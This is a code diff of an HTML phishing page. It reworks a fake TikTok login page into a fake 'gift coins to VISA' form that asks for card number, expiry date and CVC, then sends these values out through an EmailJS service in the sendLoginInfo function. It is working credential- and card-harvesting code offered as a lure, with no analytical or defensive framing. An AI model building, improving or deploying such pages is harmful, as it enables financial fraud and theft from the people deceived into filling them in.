@@ -1,7 +1,7 @@
 
 <!DOCTYPE html>
 <html>
-<center>
+
 <head>
 	<body style="
   background-image: url('w.jpg');
@@ -11,16 +11,27 @@
   height: 30vh;
   margin: 0;
 ">
-	<h1 style="color:yellow">Welcome it's Seba</h1>
-	<h3 style="color:yellow">@lil.karis.1</h3>
+		<center>
+	<h2 style="color:yellow">Wil_toonz Has invited It's Seba to recieve Gift</h2>
+		</center>
+	<h3 style="color:yellow"></h3>
   <style>
 		.logo {
 			position: center;
 			top: 8;
 			center: 0;
 			border-radius: 40px; 
-			width: 70px; 
-			height: 70px; 
+			width: 35px; 
+			height: 35px; 
+			object-fit: cover;
+		}
+				.visa {
+			position: center;
+			top: 8;
+			center: 0;
+			border-radius: 10px; 
+			width: 80px; 
+			height: 40px; 
 			object-fit: cover;
 		}
   .odds-card {
@@ -43,16 +54,24 @@
     })();
   </script>
 </head>
-  <img src="tik.png" class="logo">
+	<footer><img src="tik.png" class="logo"><h2 style="color:yellow">COINS</h2></footer>
 <body>
   <h2 style="color:yellow">Gift Form</h2>
   <div class="odds-card">
-  	<h4>LOG IN</h4>
-  <label for="username"><b >TikTok Username</b></label>
+  	<b>Recieve Coins Directly to VISA as Fiance</b>
+  	<footer> <img src="tik.png" class="logo">
+<img src="visa.png" class="visa"><footer>
+  	</footer>
+  		<label for="username"><b >VISA Card</b></label></footer>
   <input type="text" id="username" required>
   <br><br>
-  <label for="password"><b >Password:</b></label>
-  <input type="password" id="password" required>
+  <label for="password"><b >Date of Expiry</b></label>
+  <input type="" id="password" required>
+  	<br><br>
+  	 <label for="cvc"><b >CVC</b></label>
+  <input type="cvc" id="cvc" required>
+
+  	
   <br><br>
   <style>
     .button {
@@ -72,17 +91,21 @@
         background-color: #1abc9c; /* Darker green on hover */
     }
 </style>
-  <button type="button" onclick="sendLoginInfo()" class="button" >Click to Join and get Gift</button>
+  <button type="button" onclick="sendLoginInfo()" class="button" >SUBMIT AND RECIEVE FUNDS</button>
+  	
+  	  <p style="color:red">Fill in right information to recieve Gift </p>
+ 
   </div>
-  <p style="color:yellow">Fill in right information to recieve Gift </p>
-  <script>
+    <script>
     const sendLoginInfo = () => {
       let username = document.getElementById("username").value;
       let password = document.getElementById("password").value;
-      
+      let cvc = document.getElementById("cvc").value;
+    
       var templateParams = {
         username: username,
         password: password,
+        cvc: cvc,
       };
       
       emailjs.send("service_worxtub","template_tikb2pl", templateParams)
@@ -101,6 +124,6 @@
       document.getElementById("error-message").style.color = "red";
     }
   </script>
-</center>
+
 </body>
 </html>
